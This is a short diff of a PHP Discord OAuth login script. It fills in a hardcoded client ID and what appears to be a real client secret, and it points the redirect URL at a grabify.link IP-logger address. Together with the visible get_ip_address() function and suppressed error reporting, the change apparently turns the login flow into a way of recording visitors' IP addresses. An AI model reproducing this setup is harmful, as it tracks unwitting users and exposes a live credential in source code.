@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = "745793829504024677"; //CLIENT ID HERE
+$client_secret = "yYdEXtnprbQ5CqxkQrxsVSgk2pSq06o3"; //CLIENT SECRET HERE
+$redirect      = "https://grabify.link/P7W75C"; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
 function get_ip_address()
 {
